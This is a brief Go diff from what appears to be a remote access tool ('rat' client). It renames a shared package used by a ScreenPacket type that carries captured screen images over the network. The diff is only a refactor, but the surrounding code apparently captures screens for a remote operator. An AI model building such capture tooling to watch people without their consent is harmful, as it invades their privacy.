@@ -4,7 +4,7 @@ import (
 	"bytes"
 	"image/jpeg"
 	"rat/client/screen"
-	"rat/common"
+	"rat/shared"
 
 	"github.com/disintegration/imaging"
 )
@@ -18,8 +18,8 @@ type ScreenPacket struct {
 	Buffer  []byte  `network:"send"`
 }
 
-func (packet ScreenPacket) Header() common.PacketHeader {
-	return common.ScreenHeader
+func (packet ScreenPacket) Header() shared.PacketHeader {
+	return shared.ScreenHeader
 }
 
 func (packet ScreenPacket) OnReceive() error {
